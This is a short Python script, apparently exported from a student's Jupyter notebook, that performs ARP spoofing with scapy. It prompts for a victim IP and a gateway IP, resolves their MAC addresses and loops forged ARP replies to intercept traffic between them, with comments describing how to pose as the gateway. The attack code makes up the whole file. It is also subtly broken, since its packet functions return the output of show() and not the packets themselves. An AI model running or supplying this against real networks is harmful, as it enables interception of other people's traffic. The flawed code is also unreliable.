#!/usr/bin/env python
# coding: utf-8

# In[17]:

#skansara, 116750325

import scapy.all as scapy
import time


# In[10]:


# Fetching MAC address of ip we provide
def fetch_mac(ip):
    arpb=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op=1,pdst=ip)  #op=1 is who-has
    received=scapy.srp(arpb,timeout=2,verbose=False)
    return received[0][0][1].hwsrc


# In[11]:


# Spoofing the ARP entries with ours as in attacker's IP
def spoof(src_ip, dst_ip, dst_mac):
    arpspoof=scapy.ARP(op=2,psrc=src_ip, pdst=dst_ip, hwdst=dst_mac)
    
    # Here op=2 is is-at
    # psrc means source ip
    # pdst means destination ip
    # hwdst means destination mac address
    
    # The above line basically sends arp response to victim saying that this is my mac address
    # Note that here we are posing as gateway. So psrc will be gateways's ip, pdst will be victime's ip,
    # and hwdst will be victim's mac address for sending the arp response to the correct machine.
    
    # Here note that arp table entries keep on updating on regular intervals. So we need to send this spoofed packets
    # in regular intervals
    
    return arpspoof.show()


# In[12]:


def restore(src_ip,src_mac,dst_ip,dst_mac):
    restore=scapy.ARP(op=2,psrc=src_ip, hwsrc=src_mac, pdst=dst_ip, hwdst=dst_mac)
    
    return restore.show()


# In[ ]:


victim_ip=input("Enter Victim's IP: ")
gateway_ip=input("Enter Default Gateway: ")

victim_mac=fetch_mac(victim_ip)
gateway_mac=fetch_mac(gateway_ip)


# In[18]:


try:
    while True:
        print("[+] Spoofing Started....")
        print("[+] Initiating MiTM....")
        packet_to_victim=spoof(gateway_ip,victim_ip,victim_mac)
        packet_to_gateway=spoof(victim_ip,gateway_ip,gateway_mac)
        print("[+] Sending ARP packets....")
        
        scapy.send(packet_to_victim)
        scapy.send(packet_to_gateway)
        
        time.sleep(5)

except KeyboardInterrupt:
    print("[+] Stopping the sent of ARP packets...")
    print("[+] Restoring ARP tables...")
    res_pkt_to_gateway=restore(victim_ip,victim_mac,gateway_ip,gateway_mac)
    res_pkt_to_victim=restore(gateway_ip,gateway_mac,victim_ip,victim_mac)
    
    scapy.send(res_pkt_to_victim)
    scapy.send(res_pkt_to_gateway)
    


# In[ ]:




